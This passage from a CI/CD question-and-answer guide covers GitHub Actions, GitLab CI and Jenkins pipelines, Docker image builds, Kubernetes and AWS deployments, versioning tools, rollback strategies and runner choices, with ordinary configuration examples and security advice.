A common pattern is uploading screenshots or logs only when tests fail. Prefer `!cancelled()` over `always()` for cleanup that shouldn't run after a manual cancel.

## 163: How do rules work in GitLab CI?

`rules` decide if a job is added to a pipeline and how it runs. They are checked in order, and the first one that matches wins.

```yaml
deploy-prod:
  script: ./deploy.sh production
  rules:
    - if: $CI_PIPELINE_SOURCE == "merge_request_event"
      when: never
    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH
      when: manual
    - when: never
```

`rules` replaced the older `only` and `except` keywords, which still work but are not recommended. You can also use `workflow:rules` to decide if the whole pipeline should be created.

## 164: What is the difference between the push and pull_request triggers in GitHub Actions?

- `push` runs on the commit that was pushed to a branch or tag. It runs with the repository's full secrets.
- `pull_request` runs on a special merge commit (`refs/pull/N/merge`) that shows what main would look like after the merge. For PRs from forks, it runs without secrets and with a read-only token.

If you use both on a PR branch in the same repo, you get two runs per push. A common setup is `push` on `main` only, plus `pull_request` for everything else.

## 165: What is pull_request_target and why is it risky?

`pull_request_target` runs in the context of the base branch, not the PR. It has access to secrets and a write token even for PRs from forks. It's meant for tasks like labeling PRs or posting comments.

The danger is checking out and running the PR's code in that workflow. A malicious PR could change a build script or a test and steal your secrets. If you use `pull_request_target`, never build or run untrusted code from the PR in it.

## 166: How do you cancel old pipeline runs when a new commit is pushed?

In GitHub Actions, use `concurrency` with `cancel-in-progress`.

```yaml
concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: true
```

In GitLab, mark jobs as `interruptible: true` and turn on "Auto-cancel redundant pipelines" in the settings.

Be careful with deployment jobs. Usually you don't want to cancel a production deploy halfway, so give them their own concurrency group without `cancel-in-progress`.

## 167: How do you stop two deployments from running at the same time?

Use a lock for the environment.

```yaml
# GitHub Actions
jobs:
  deploy:
    concurrency:
      group: deploy-production
      cancel-in-progress: false
```

```yaml
# GitLab
deploy:
  resource_group: production
  script: ./deploy.sh
```

In Jenkins you can use `disableConcurrentBuilds()` or the Lockable Resources plugin. This way deploys wait in line instead of stepping on each other.

## 168: How do environments work in GitHub Actions?

You create environments (like `staging` and `production`) in the repository settings and use them in a job.

```yaml
jobs:
  deploy:
    runs-on: ubuntu-latest
    environment:
      name: production
      url: https://example.com
    steps:
      - run: ./deploy.sh
        env:
          API_KEY: ${{ secrets.API_KEY }}
```

An environment can have its own secrets and variables, required reviewers, a wait timer, and rules about which branches or tags can deploy to it. GitHub also keeps a deployment history per environment.

## 169: How do environments work in GitLab?

You set `environment` on a job. GitLab tracks every deployment to it and shows which commit is running where.

```yaml
deploy-staging:
  stage: deploy
  script: ./deploy.sh staging
  environment:
    name: staging
    url: https://staging.example.com
  rules:
    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH
```

You can protect an environment so only some people can deploy to it, scope CI/CD variables to it, and use dynamic names like `review/$CI_COMMIT_REF_SLUG` for review apps, with `on_stop` to clean them up.

## 170: How do you use different secrets for staging and production?

Scope the secrets to the environment instead of the whole repository. In GitHub Actions, add them as environment secrets. In GitLab, set the variable's environment scope. Then the same name (like `DATABASE_URL`) has a different value depending on where the job deploys.

```yaml
deploy:
  strategy:
    matrix:
      env: [staging, production]
  environment: ${{ matrix.env }}
  runs-on: ubuntu-latest
  steps:
    - run: ./deploy.sh
      env:
        DATABASE_URL: ${{ secrets.DATABASE_URL }}
```

Protect production secrets so only jobs from main (or approved runs) can read them.

## 171: What are reusable workflows in GitHub Actions?

A reusable workflow is a whole workflow that other workflows can call, like a function. It's defined with the `workflow_call` trigger.

```yaml
# .github/workflows/deploy.yml
on:
  workflow_call:
    inputs:
      environment:
        type: string
        required: true
    secrets:
      DEPLOY_TOKEN:
        required: true

jobs:
  deploy:
    runs-on: ubuntu-latest
    environment: ${{ inputs.environment }}
    steps:
      - run: echo "Deploying to ${{ inputs.environment }}"
```

```yaml
# caller
jobs:
  staging:
    uses: my-org/shared-workflows/.github/workflows/deploy.yml@v2
    with:
      environment: staging
    secrets: inherit
```

They are good for sharing a standard pipeline across many repos.

## 172: What is a composite action and how is it different from a reusable workflow?

A composite action groups several steps into one action, stored in an `action.yml` file. It's used as a single step inside a job.

```yaml
# .github/actions/setup/action.yml
name: Setup
runs:
  using: composite
  steps:
    - uses: actions/setup-node@v6
      with:
        node-version: 22
        cache: npm
    - run: npm ci
      shell: bash
```

| Composite action                  | Reusable workflow                   |
| --------------------------------- | ----------------------------------- |
| Used as a step                    | Used as a job                       |
| Runs inside the caller's job      | Runs its own jobs and runners       |
| Can't use environments or `needs` | Can have several jobs, environments |
| Good for repeated setup steps     | Good for a whole standard pipeline  |

## 173: How do you reuse configuration in GitLab CI?

GitLab has a few tools:

- `include`: pull in YAML from another file, project, URL or a CI/CD component
- `extends`: inherit settings from another job, often a hidden one that starts with a dot
- `!reference`: reuse a specific part of another job, like its `script`
- CI/CD components and the CI/CD Catalog: versioned, reusable pipeline pieces with inputs

```yaml
include:
  - project: my-group/ci-templates
    ref: v3.1.0
    file: /node.yml

.node-job:
  image: node:22
  before_script:
    - npm ci

test:
  extends: .node-job
  script: npm test
```

## 174: What are YAML anchors and when are they useful?

Anchors let you define a block once and reuse it in the same file. `&name` defines it, `*name` reuses it, and `<<: *name` merges a map.

```yaml
.defaults: &defaults
  image: node:22
  before_script:
    - npm ci

test:
  <<: *defaults
  script: npm test

lint:
  <<: *defaults
  script: npm run lint
```

GitLab supports them fully. GitHub Actions added support for anchors in 2025, but reusable workflows and composite actions are usually clearer there. Anchors only work inside one file, and heavy use makes files hard to read.

## 175: What are Jenkins shared libraries?

A shared library is a Git repository with Groovy code that many Jenkinsfiles can use. It lets you write common steps once, like "build and push a Docker image", and call them from all your projects.

```groovy
@Library('my-shared-lib@v1.2') _

pipeline {
  agent any
  stages {
    stage('Build') {
      steps {
        buildDockerImage(name: 'my-app')
      }
    }
  }
}
```

Functions go in the `vars/` folder of the library. Pin the library to a version so a change in it doesn't break every pipeline at once.

## 176: How do agents and labels work in Jenkins?

The Jenkins controller schedules work, and agents run it. You give agents labels like `linux`, `docker` or `gpu`, and pipelines ask for agents with a label.

```groovy
pipeline {
  agent { label 'linux && docker' }
  stages {
    stage('Build') {
      agent {
        docker { image 'node:22' }
      }
      steps {
        sh 'npm ci && npm run build'
      }
    }
  }
}
```

You can also run agents as Kubernetes pods with the Kubernetes plugin, so each build gets a fresh pod.

## 177: What is the post section in a Jenkins pipeline?

`post` runs steps after the pipeline or a stage finishes, based on the result.

```groovy
pipeline {
  agent any
  stages {
    stage('Test') {
      steps {
        sh 'npm test'
      }
    }
  }
  post {
    always {
      junit 'reports/**/*.xml'
    }
    failure {
      echo 'Build failed'
    }
    cleanup {
      cleanWs()
    }
  }
}
```

Conditions include `always`, `success`, `failure`, `unstable`, `changed`, `fixed`, `aborted` and `cleanup`.

## 178: How do you use credentials in a Jenkins pipeline?

Store them in Jenkins credentials and bind them in the pipeline, so they are only available inside a block and masked in the logs.

```groovy
pipeline {
  agent any
  environment {
    API_TOKEN = credentials('api-token')
  }
  stages {
    stage('Deploy') {
      steps {
        withCredentials([usernamePassword(credentialsId: 'registry',
            usernameVariable: 'USER', passwordVariable: 'PASS')]) {
          sh 'echo "$PASS" | docker login -u "$USER" --password-stdin registry.example.com'
        }
      }
    }
  }
}
```

Use single quotes in `sh` so the shell reads the variable, not Groovy. With double quotes, Groovy puts the secret into the command string, and Jenkins warns about it.

## 179: How do you run stages in parallel in Jenkins?

Use a `parallel` block inside a stage.

```groovy
stage('Checks') {
  parallel {
    stage('Lint') {
      steps { sh 'npm run lint' }
    }
    stage('Unit tests') {
      steps { sh 'npm test' }
    }
  }
}
```

Add `failFast true` to the stage to stop the other branches when one fails. Each branch can run on a different agent.

## 180: What is a Jenkins multibranch pipeline?

A multibranch pipeline job scans a repository and creates a pipeline for each branch and pull request that has a `Jenkinsfile`. New branches get jobs automatically, and jobs for deleted branches are removed.

Inside the Jenkinsfile you can check `env.BRANCH_NAME` or use `when { branch 'main' }` to do different things per branch. Organization folders do the same for every repo in a GitHub or GitLab organization.

## 181: What options does a matrix strategy have in GitHub Actions?

```yaml
strategy:
  fail-fast: false
  max-parallel: 4
  matrix:
    node: [20, 22, 24]
    os: [ubuntu-latest, windows-latest]
    exclude:
      - os: windows-latest
        node: 20
    include:
      - os: ubuntu-latest
        node: 24
        experimental: true
```

- `fail-fast` (default `true`) cancels other matrix jobs when one fails. Turn it off if you want to see all results.
- `max-parallel` limits how many run at the same time.
- `exclude` removes combinations, `include` adds extra ones or extra values.
- A matrix can create at most 256 jobs per workflow run.

## 182: How does parallel:matrix work in GitLab?

```yaml
test:
  image: node:$NODE_VERSION
  script: npm test
  parallel:
    matrix:
      - NODE_VERSION: ["20", "22", "24"]
        DB: ["postgres", "mysql"]
```

This creates 6 jobs. You can also use `parallel: 5` without a matrix, which creates 5 copies of the job with `CI_NODE_INDEX` and `CI_NODE_TOTAL` variables, useful for splitting tests.

## 183: How do you split a slow test suite across several jobs?

Run the same job several times in parallel and give each one part of the tests. Many test runners support this directly.

```yaml
jobs:
  e2e:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        shard: [1, 2, 3, 4]
    steps:
      - uses: actions/checkout@v6
      - uses: actions/setup-node@v6
        with:
          node-version: 22
          cache: npm
      - run: npm ci
      - run: npx playwright install --with-deps
      - run: npx playwright test --shard=${{ matrix.shard }}/4
```

Jest and Vitest also support `--shard`. Splitting by past run time (not just file count) gives more even shards. Some tools, like CircleCI, can split by timing for you.

## 184: How do you build and push a Docker image with GitHub Actions properly?

```yaml
jobs:
  image:
    runs-on: ubuntu-latest
    permissions:
      contents: read
      packages: write
    steps:
      - uses: actions/checkout@v6
      - uses: docker/setup-buildx-action@v3
      - uses: docker/login-action@v3
        with:
          registry: ghcr.io
          username: ${{ github.actor }}
          password: ${{ secrets.GITHUB_TOKEN }}
      - uses: docker/build-push-action@v6
        with:
          context: .
          push: ${{ github.event_name != 'pull_request' }}
          tags: ghcr.io/${{ github.repository }}:${{ github.sha }}
          cache-from: type=gha
          cache-to: type=gha,mode=max
```

It builds on every PR to check the Dockerfile, but only pushes from main. The `type=gha` cache stores layers in the GitHub Actions cache so later builds are faster.

## 185: How do you make Docker builds fast in CI?

- Order the Dockerfile so things that change rarely come first. Copy `package.json` and the lock file, install, then copy the source.
- Use a `.dockerignore` to keep `node_modules`, `.git` and build output out of the context.
- Use multi-stage builds so the final image is small.
- Use BuildKit cache mounts for package manager caches.
- Store the layer cache between runs: `type=gha`, `type=registry` or `type=local`.

```dockerfile
FROM node:22-alpine AS deps
WORKDIR /app
COPY package.json package-lock.json ./
RUN --mount=type=cache,target=/root/.npm npm ci

FROM deps AS build
COPY . .
RUN npm run build
```

Without a stored cache, every build on a fresh runner starts from zero.

## 186: Why use multi-stage Dockerfiles?

A multi-stage Dockerfile uses one stage with all the build tools to compile the app, and a final stage that only copies the result. The final image doesn't contain compilers, dev dependencies or source code.

```dockerfile
FROM node:22-alpine AS build
WORKDIR /app
COPY package.json package-lock.json ./
RUN npm ci
COPY . .
RUN npm run build && npm prune --omit=dev

FROM node:22-alpine
WORKDIR /app
ENV NODE_ENV=production
COPY --from=build /app/node_modules ./node_modules
COPY --from=build /app/dist ./dist
USER node
CMD ["node", "dist/server.js"]
```

Smaller images push and pull faster, start faster, and have fewer packages that can have vulnerabilities.

## 187: How should you tag Docker images in a pipeline?

Use tags that point to exactly one build and never change:

- The full or short commit SHA: `my-app:3f2a1c9`
- The release version: `my-app:1.4.2`

You can add moving tags too, like `main` or `1.4`, for convenience, but deploy with the fixed ones. For even more safety, deploy by digest (`my-app@sha256:...`), which can't change at all. Turning on tag immutability in the registry (ECR supports it) stops anyone from overwriting a tag.

## 188: What is the difference between Docker-in-Docker and mounting the Docker socket?

To run `docker` commands inside a containerized CI job, you have two options:

- **Docker-in-Docker (DinD)**: run a separate Docker daemon inside a container (`docker:dind` service in GitLab). It's isolated from the host, but needs privileged mode and has no shared layer cache.
- **Socket mounting**: mount `/var/run/docker.sock` from the host. It's fast and shares the cache, but the job gets full control of the host's Docker, which is a big security risk.

Safer options are rootless builders like BuildKit in rootless mode, Kaniko-style builders, or Buildah. Hosted runners on GitHub have Docker available directly, so this is mostly a question for self-hosted and Kubernetes runners.

## 189: How do you run a database for tests in GitHub Actions?

Use service containers. They start before the job's steps and are reachable from the job.

```yaml
jobs:
  test:
    runs-on: ubuntu-latest
    services:
      postgres:
        image: postgres:17
        env:
          POSTGRES_PASSWORD: postgres
          POSTGRES_DB: app_test
        ports:
          - 5432:5432
        options: >-
          --health-cmd "pg_isready -U postgres"
          --health-interval 5s
          --health-timeout 5s
          --health-retries 10
    env:
      DATABASE_URL: postgres://postgres:postgres@localhost:5432/app_test
    steps:
      - uses: actions/checkout@v6
      - run: npm ci
      - run: npm run migrate && npm run test:integration
```

The health check makes the job wait until Postgres is ready. Service containers work on Linux runners only.

## 190: How do services work in GitLab CI?

`services` start extra containers next to the job container. You reach them by their alias as a host name.

```yaml
test:
  image: node:22
  services:
    - name: postgres:17
      alias: db
  variables:
    POSTGRES_PASSWORD: postgres
    POSTGRES_DB: app_test
    DATABASE_URL: postgres://postgres:postgres@db:5432/app_test
  script:
    - npm ci
    - npm run test:integration
```

Variables defined in the job are also passed to the service containers, which is how Postgres gets its password here.

## 191: How do you run Playwright E2E tests in CI?

```yaml
jobs:
  e2e:
    runs-on: ubuntu-latest
    timeout-minutes: 30
    steps:
      - uses: actions/checkout@v6
      - uses: actions/setup-node@v6
        with:
          node-version: 22
          cache: npm
      - run: npm ci
      - run: npx playwright install --with-deps
      - run: npx playwright test
      - uses: actions/upload-artifact@v5
        if: ${{ !cancelled() }}
        with:
          name: playwright-report
          path: playwright-report/
          retention-days: 14
```

Playwright's `webServer` config can start the app before tests. Use `retries` in CI only, and turn on traces on the first retry, so you get a full trace when a test fails. You can also run inside the official `mcr.microsoft.com/playwright` image to skip installing browsers.

## 192: How do you show test results in pull requests?

Make your test runner write a JUnit XML report, which almost every CI tool understands.

- **GitLab**: `artifacts:reports:junit: report.xml` shows results in the merge request.
- **Jenkins**: the `junit` step shows trends and failed tests.
- **GitHub Actions**: there is no built-in viewer, so teams use a community action to publish results as a check, or write a summary to `GITHUB_STEP_SUMMARY`.

```yaml
# GitLab
test:
  script: npx vitest run --reporter=junit --outputFile=report.xml
  artifacts:
    when: always
    reports:
      junit: report.xml
```

## 193: How do you fail the build when coverage drops?

Set coverage thresholds in the test runner. If coverage is below them, the test command exits with an error.

```js
// vitest.config.ts
import { defineConfig } from "vitest/config";

export default defineConfig({
  test: {
    coverage: {
      provider: "v8",
      thresholds: {
        lines: 80,
        branches: 75,
      },
    },
  },
});
```

Jest has `coverageThreshold` for the same. Another approach is checking coverage only on new or changed code (SonarQube, Codecov), which is fairer for older projects with low coverage.

## 194: How do you deal with flaky tests in a pipeline?

1. **Find them**: track which tests fail and then pass on retry. Many tools and test reporters show this.
2. **Quarantine**: move known flaky tests to a separate, non-blocking job so they don't block merges, and create a ticket.
3. **Fix the cause**: usually waiting for fixed times instead of conditions, shared state between tests, test order, real network calls, time zones or random data.
4. **Limit retries**: retries in CI can hide flakiness. Use them, but report tests that only pass on retry.

The main rule: don't let the team get used to red builds.

## 195: Should you add automatic retries to CI jobs?

Retries help with real infrastructure problems, like a network timeout when downloading packages or a runner that died. GitLab has `retry` with conditions like `runner_system_failure`.

```yaml
test:
  script: npm test
  retry:
    max: 2
    when:
      - runner_system_failure
      - stuck_or_timeout_failure
```

But retrying on any failure hides flaky tests and real bugs. Retry only for infrastructure errors, and keep an eye on how often retries happen.

## 196: How do you run database migrations safely in a CD pipeline?

- Run migrations as a separate step before the new app version starts, not inside every app instance on startup (several instances would race).
- Make migrations backward compatible, so the old version still works while the rolling deploy runs.
- Split breaking changes into steps: add the new column, deploy code that writes both, backfill, switch reads, then drop the old column in a later release (expand and contract).
- Test migrations in CI against a real database of the same engine and version.
- Have a plan for failures, since many migrations can't be rolled back easily.

## 197: How do you deploy to Kubernetes from a pipeline?

The simple push-based way: the pipeline has cluster credentials and applies the new manifests.

```yaml
- run: |
    kubectl set image deployment/my-app app=ghcr.io/my-org/my-app:${{ github.sha }}
    kubectl rollout status deployment/my-app --timeout=5m
```

Or with Helm:

```bash
helm upgrade --install my-app ./chart \
  --namespace prod \
  --set image.tag="$GITHUB_SHA" \
  --wait --timeout 5m
```

`rollout status` and `--wait` make the pipeline fail if the new pods don't become ready. Many teams now prefer GitOps, where the pipeline only updates a Git repo and Argo CD or Flux applies the change.

## 198: What is Helm and how is it used in CD?

Helm is a package manager for Kubernetes. A chart is a set of Kubernetes templates plus a `values.yaml` file with settings. You install or upgrade a release with different values per environment.

```bash
helm upgrade --install api ./charts/api \
  -f values/production.yaml \
  --set image.tag=1.4.2 \
  --atomic --timeout 10m
```

`--atomic` rolls back automatically if the upgrade fails. Helm keeps a history of releases, so `helm rollback api 12` goes back to an earlier one.

## 199: What is Kustomize?

Kustomize customizes plain Kubernetes YAML without templates. You have a `base` folder with common manifests and `overlays` per environment that patch them, for example to change the replica count or image tag.

```yaml
# overlays/production/kustomization.yaml
resources:
  - ../../base
images:
  - name: my-app
    newName: ghcr.io/my-org/my-app
    newTag: 3f2a1c9
replicas:
  - name: my-app
    count: 5
```

It's built into `kubectl` (`kubectl apply -k overlays/production`). Argo CD and Flux support it out of the box. A CI step can update the tag with `kustomize edit set image`.

## 200: How would you deploy a container to AWS ECS from a pipeline?

1. Build and push the image to ECR, tagged with the commit SHA.
2. Render a new task definition with the new image.
3. Update the ECS service to use it and wait for it to become stable.

```yaml
- uses: aws-actions/amazon-ecs-render-task-definition@v1
  id: render
  with:
    task-definition: task-definition.json
    container-name: api
    image: ${{ steps.build.outputs.image }}
- uses: aws-actions/amazon-ecs-deploy-task-definition@v2
  with:
    task-definition: ${{ steps.render.outputs.task-definition }}
    service: api
    cluster: production
    wait-for-service-stability: true
```

ECS does a rolling update by default. It also supports blue-green deployments, either built in or through CodeDeploy, and a deployment circuit breaker that rolls back automatically.

## 201: How do you deploy a frontend to S3 and CloudFront from a pipeline?

```yaml
- run: npm ci && npm run build
- uses: aws-actions/configure-aws-credentials@v4
  with:
    role-to-assume: arn:aws:iam::123456789012:role/deploy-frontend
    aws-region: eu-west-1
- run: |
    aws s3 sync dist/ s3://my-site --delete \
      --cache-control "public,max-age=31536000,immutable" \
      --exclude "index.html"
    aws s3 cp dist/index.html s3://my-site/index.html \
      --cache-control "no-cache"
    aws cloudfront create-invalidation \
      --distribution-id "$DISTRIBUTION_ID" --paths "/index.html"
```

Files with a hash in the name are cached for a long time, while `index.html` is never cached, so users get new asset links right away. That way you only need to invalidate `index.html`, not everything.

## 202: How do preview deployments on Vercel or Netlify work?

When you connect the repo, the platform builds every push. Pushes to the production branch go to the production URL. Pushes to other branches and pull requests get their own unique preview URL, and the platform posts the link as a comment or check on the PR.

Things to think about: previews may need their own environment variables (don't point them at the production database), they may need password protection, and E2E tests can run against the preview URL once the deployment is ready.

## 203: What is OIDC in CI/CD and why use it instead of stored cloud keys?

With OpenID Connect (OIDC), the CI job asks the CI provider for a short-lived signed token that says "I am a job from repo X, branch Y, environment Z". The cloud provider (AWS, Azure, GCP) trusts the CI provider and swaps that token for temporary credentials.

```yaml
permissions:
  id-token: write
  contents: read

steps:
  - uses: aws-actions/configure-aws-credentials@v4
    with:
      role-to-assume: arn:aws:iam::123456789012:role/github-deploy
      aws-region: eu-west-1
```

There are no long-lived access keys stored as secrets, so nothing can leak and nothing needs rotating. The cloud role can also be limited to a specific repo and branch.

## 204: What is GITHUB_TOKEN?

`GITHUB_TOKEN` is a token that GitHub creates automatically for each workflow run. It can call the GitHub API for the current repository, for example to push to GHCR, comment on PRs or create releases. It expires when the job ends.

Its permissions are set with the `permissions` key. Events triggered by this token (like a push it made) do not start new workflow runs, to avoid endless loops. If you need that, use a GitHub App token.

## 205: Why should you set the permissions key in workflows?

By default `GITHUB_TOKEN` can have wide write access, depending on repo and org settings. If a step or a third-party action is compromised, it can use those permissions.

Set the smallest permissions you need, at the top of the workflow, and add more only where needed:

```yaml
permissions:
  contents: read

jobs:
  release:
    permissions:
      contents: write
      id-token: write
    runs-on: ubuntu-latest
    steps:
      - run: echo "release"
```

It's also a good idea to set the organization default to read-only.

## 206: Why pin actions to a commit SHA?

A tag like `@v4` can be moved by the action's owner, or by an attacker who takes over the repo, to point to different code. That code then runs in your pipeline with your secrets. This happened in 2025 with the `tj-actions/changed-files` action, where tags were changed to point to code that dumped secrets into logs.

Pinning to a full commit SHA means you always run the exact code you reviewed:

```yaml
- uses: actions/checkout@08eba0b27e820071cde6df949e0beb9ba4906955 # v4.3.0
```

Keep a comment with the version, and let Dependabot or Renovate update the SHAs. GitHub also lets admins require SHA pinning in policy settings.

## 207: How does automated versioning with semantic-release work?

semantic-release reads the commit messages since the last release, decides the next version number, creates a Git tag and release notes, and publishes the package, all in the pipeline.

- `fix: ...` gives a patch release
- `feat: ...` gives a minor release
- `BREAKING CHANGE:` in the footer or `feat!:` gives a major release

```yaml
- run: npx semantic-release
  env:
    GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
    NPM_TOKEN: ${{ secrets.NPM_TOKEN }}
```

It only works well if everyone follows the commit message format, so teams usually check messages with commitlint. release-please is a similar tool that opens a release PR you merge when ready.

## 208: What are Conventional Commits?

A format for commit messages: `type(scope): description`.

```text
feat(cart): add discount codes
fix(auth): handle expired refresh tokens
docs: update setup steps
chore(deps): bump vite to 7.1.0
feat(api)!: remove v1 endpoints
```

Common types are `feat`, `fix`, `docs`, `refactor`, `test`, `chore`, `ci`, `perf`. Because the format is fixed, tools can generate changelogs and choose version numbers from it. You can check it in CI or in a `commit-msg` hook with commitlint.

## 209: How does Changesets work for versioning in a monorepo?

With Changesets, developers add a small Markdown file to their PR that says which packages changed and whether it's a patch, minor or major change.

```bash
npx changeset
```

In the pipeline, the Changesets action collects these files and opens a "Version Packages" PR that bumps versions and updates changelogs. When that PR is merged, the action publishes the packages. It's popular for JavaScript monorepos because each package can be versioned separately.

## 210: How do you publish an npm package from CI?

```yaml
on:
  push:
    tags: ["v*"]

permissions:
  contents: read
  id-token: write

jobs:
  publish:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v6
      - uses: actions/setup-node@v6
        with:
          node-version: 24
          registry-url: https://registry.npmjs.org
      - run: npm ci
      - run: npm test
      - run: npm publish
```

This uses npm trusted publishing: you link the package to this repo and workflow on npmjs.com, and npm accepts the OIDC token from GitHub, so no `NPM_TOKEN` secret is needed. It also adds provenance automatically. The older way is an automation token in `NODE_AUTH_TOKEN`, which still works but is a long-lived secret.

## 211: How do you create a GitHub release from a pipeline?

Use the `gh` CLI, which is installed on GitHub-hosted runners.

```yaml
on:
  push:
    tags: ["v*"]

permissions:
  contents: write

jobs:
  release:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v6
      - run: npm ci && npm run build && tar -czf app.tar.gz dist
      - run: gh release create "$GITHUB_REF_NAME" app.tar.gz --generate-notes
        env:
          GH_TOKEN: ${{ github.token }}
```

`--generate-notes` builds release notes from merged PRs since the last tag.

## 212: What does promoting a build between environments mean?

Promotion means taking the same artifact that passed in one environment and deploying it to the next one, without rebuilding.

```text
build (image: app:3f2a1c9)
  → deploy to dev       → tests pass
  → deploy to staging   → tests pass, approval
  → deploy to production
```

The only thing that changes between environments is configuration. In GitOps setups, promotion is often a PR that copies the image tag from the staging folder to the production folder.

## 213: How do you handle configuration for different environments?

Keep config out of the build and pass it in at deploy or run time (the "Twelve-Factor App" idea). Common ways:

- Environment variables set by the platform
- Kubernetes ConfigMaps and Secrets
- Helm values or Kustomize overlays per environment
- A secret manager (AWS Secrets Manager, Azure Key Vault, HashiCorp Vault) read at startup

Frontend apps are a special case, because bundlers usually bake env vars in at build time. To build once and deploy many, load config at runtime from a `config.json` or an endpoint instead.

## 214: How do you manage feature flags in a CI/CD workflow?

- Create a flag when starting a feature, default off.
- Merge and deploy the code behind the flag as you go.
- Turn it on in dev and staging, then for internal users, then for a percentage of real users.
- Once it's at 100% and stable, remove the flag and the old code path.

The last step is the one people forget. Old flags pile up and make code hard to read and test. Track flags with an owner and an expiry date, and test both on and off states for important flags.

## 215: How would you implement blue-green deployments in practice?

1. Two environments (blue and green) behind a load balancer, router or DNS.
2. Deploy the new version to the idle one (say green).
3. Run smoke tests against green using its own internal URL.
4. Switch traffic to green.
5. Keep blue running for a while so you can switch back fast.
6. After it looks stable, blue becomes the target for the next deploy.

In Kubernetes you can do this with two Deployments and switch the Service selector, or use Argo Rollouts. AWS has built-in blue-green for ECS and Elastic Beanstalk. The tricky parts are database changes and long-running connections or jobs.

## 216: How would you implement a canary release in practice?

1. Deploy the new version next to the old one with a small share of traffic, like 5%.
2. Compare metrics for canary vs stable: error rate, latency, CPU, business metrics.
3. If they look good after a set time, go to 25%, 50%, 100%.
4. If not, send all traffic back to the stable version.

Traffic splitting can be done by a load balancer with weighted targets, a service mesh like Istio or Linkerd, an ingress controller, or a tool like Argo Rollouts or Flagger that automates the steps and the metric checks.

## 217: How do rolling updates work in Kubernetes?

A Deployment replaces old pods with new ones step by step. Two settings control the speed:

```yaml
spec:
  replicas: 10
  strategy:
    type: RollingUpdate
    rollingUpdate:
      maxSurge: 25%
      maxUnavailable: 0
```

- `maxSurge`: how many extra pods can be created above the replica count
- `maxUnavailable`: how many pods can be down during the update

With `maxUnavailable: 0`, Kubernetes only removes an old pod after a new one is ready. `kubectl rollout undo deployment/my-app` goes back to the previous version.

## 218: Why do readiness and liveness probes matter for deployments?

- **Readiness probe**: tells Kubernetes when a pod can receive traffic. During a rolling update, new pods only get traffic once they are ready, and old ones are only removed after that.
- **Liveness probe**: tells Kubernetes when to restart a pod that is stuck.
- **Startup probe**: gives slow-starting apps time before liveness checks begin.

Without a readiness probe, Kubernetes sends traffic to pods that are still starting, and users get errors during every deploy. A badly tuned liveness probe can restart healthy pods in a loop.

## 219: How do you set up automatic rollback?

The deployment tool watches health signals and goes back to the old version if they fail:

- `helm upgrade --atomic` rolls back if the release doesn't become ready.
- ECS deployment circuit breaker with `rollback: true`.
- Argo Rollouts and Flagger roll back if analysis of metrics fails.
- A pipeline step that runs smoke tests and calls the rollback command on failure.

The important part is choosing good signals: error rate and latency from real traffic are better than "the process started".

## 220: What is the difference between rolling back and rolling forward?

**Rolling back** means deploying the previous version again. **Rolling forward** means fixing the problem and deploying a new version.

Rolling back is usually faster and safer when the cause is not clear. Rolling forward can be the only option when the bad version made changes that the old version can't handle, like a database migration or a changed message format. A fast pipeline makes rolling forward realistic, since a fix can be in production in minutes.

## 221: How do database changes affect rollbacks?

The app can be rolled back in seconds, but the database can't be undone so easily. If the new version dropped a column or changed data, the old version may break when you roll back.

That's why schema changes should be backward compatible: the old app version should still work with the new schema. Destructive changes (dropping columns, renaming) happen in a later release, once no running code needs the old structure.

## 222: How do you build only what changed in a monorepo?

Options from simple to advanced:

- **Path filters**: run the `web` workflow only when `apps/web/**` or shared packages change.
- **Monorepo tools**: Nx (`nx affected`), Turborepo (`turbo run build --filter=...[origin/main]`) and others look at the dependency graph and run tasks only for changed projects and the projects that depend on them.
- **Build systems** like Bazel or Pants that track inputs for every target.

```bash
npx nx affected -t lint test build --base=origin/main --head=HEAD
```

The tools need Git history to compare, so use `fetch-depth: 0` or fetch the base branch.

## 223: How does remote caching help CI in a monorepo?

Tools like Nx and Turborepo save the output of each task (build, test, lint) with a hash of its inputs. If the inputs haven't changed, they skip the task and restore the output.

With a remote cache, this is shared between all CI runs and developers. If one PR already built a package, the next run gets the result in seconds. Nx Cloud and Vercel Remote Cache are hosted options, and you can also run your own.

The risk is wrong cache hits if the task's inputs are not fully declared, like an environment variable the build reads but the hash doesn't include.

## 224: What are the main ways to speed up a slow pipeline?

1. **Measure first**: find which jobs and steps take the most time.
2. **Run in parallel**: split independent jobs and shard tests.
3. **Cache** dependencies, Docker layers and build outputs.
4. **Do less**: run only affected projects, skip work for docs-only changes.
5. **Fail fast**: put quick checks first.
6. **Bigger runners** for CPU-heavy jobs.
7. **Move slow suites** (full E2E, performance) to merge queue or nightly runs, if you can accept it.
8. **Fix slow tests**: often a few tests take most of the time.

## 225: How do you find out where a pipeline spends its time?

- Look at the duration of each job and step in the CI UI.
- Compare queue time (waiting for a runner) with run time.
- Use the CI tool's insights or analytics pages to see trends.
- Make test runners print the slowest tests (Jest and Vitest can report slow tests, Playwright has a report with durations).
- Use `time` in scripts or add timing logs.

Often the problem is not one thing but many small ones: a slow install, no cache, everything in one job.

## 226: When would you use self-hosted runners?

- You need access to private networks or on-premises systems.
- You need special hardware: GPUs, ARM, lots of memory, macOS with specific Xcode versions.
- You run a lot of CI and hosted minutes get expensive.
- You need software preinstalled that takes a long time to set up.
- Compliance rules say builds must run in your own infrastructure.

The cost is maintenance: updates, scaling, cleaning between jobs and security. Avoid self-hosted runners on public repos, since anyone can open a PR that runs code on them.

## 227: What are ephemeral runners and why are they safer?

An ephemeral runner handles one job and is then destroyed. The next job gets a brand new machine or container.

This prevents one job from leaving behind files, credentials, processes or a poisoned cache that affect the next job. It also gives consistent, clean builds. GitHub's `--ephemeral` runner option, Actions Runner Controller on Kubernetes, and GitLab's autoscaling executors all support this. Persistent self-hosted runners are faster to start but riskier.

## 228: How do you choose which runner a job uses?

In GitHub Actions with `runs-on`, which can be a hosted label, a set of self-hosted labels, or a runner group.

```yaml
runs-on: ubuntu-latest
```

```yaml
runs-on: [self-hosted, linux, arm64]
```

In GitLab with `tags`:

```yaml
build:
  tags:
    - docker
    - arm64
```

In Jenkins with `agent { label '...' }`. Use specific labels for jobs that need special machines, and default runners for everything else.

## 229: What are GitLab runner executors?

The executor decides how a GitLab runner runs a job:

